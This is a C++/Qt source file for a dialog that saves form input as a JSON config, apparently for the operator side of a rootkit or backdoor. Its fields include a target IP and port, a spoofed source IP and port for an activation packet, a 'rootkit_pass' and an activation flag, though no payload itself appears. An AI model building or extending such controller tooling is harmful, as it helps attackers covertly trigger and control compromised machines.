#include "addconfig.h"
#include "ui_addconfig.h"


AddConfig::AddConfig(QWidget *parent) :
    QWidget(parent),
    ui(new Ui::AddConfig)
{
    ui->setupUi(this );

    connect(ui->pushButton, SIGNAL(clicked()), this, SLOT(slot_write_config()));


}

AddConfig::~AddConfig()
{
    delete ui;
}

void AddConfig::slot_write_config()
{
//    char config_path[] = "config";
    QString config_path = QString("%1/%2")
            .arg(QCoreApplication::applicationDirPath())
            .arg("/config");
//    if((dir = opendir(config_path))==0)	//无法打开则跳过
//    {


//    } else{
//        closedir(dir);
//    }

    QDir dir(config_path);
    if(!dir.exists())
    {
        dir.mkdir(config_path);
        qDebug()<<"文件夹创建成功";
    }

    QString path = QString("config/%1").arg(ui->lab_save_path->toPlainText());
    QFile file(path);
    QJsonDocument endJsonDoc;
    QJsonObject mainJson;

    mainJson.insert("local_listen_ip",ui->lab_local_ip->toPlainText());
    mainJson.insert("local_listen_port",ui->lab_local_port->toPlainText());
    mainJson.insert("activatepPackage_fake_src_ip",ui->lab_fake_ip->toPlainText());
    mainJson.insert("activatepPackage_fake_src_port",ui->lab_fake_port->toPlainText());
    mainJson.insert("target_ip",ui->lab_target_ip->toPlainText());
    mainJson.insert("target_port", ui->lab_target_port->toPlainText());
    mainJson.insert("activate_package_protocol", ui->lab_activate_protocol->toPlainText());
    mainJson.insert("rootkit_pass", ui->lab_rootkit_pass->toPlainText());
    mainJson.insert("activate_flag",ui->lab_activate_flag->toPlainText());


    endJsonDoc.setObject(mainJson);
    file.open(QIODevice::WriteOnly | QIODevice::Text);
    if(!file.isOpen()){
        qDebug()<<path<<"文件打开失败";
        this->close();
    }
    file.write(endJsonDoc.toJson(QJsonDocument::Indented));
    file.close();
    QString dlg_title = "info";
    QString strInfo = "添加成功";
    QMessageBox::information(this, dlg_title, strInfo
      , QMessageBox::Ok, QMessageBox::NoButton);


    this->close();
}
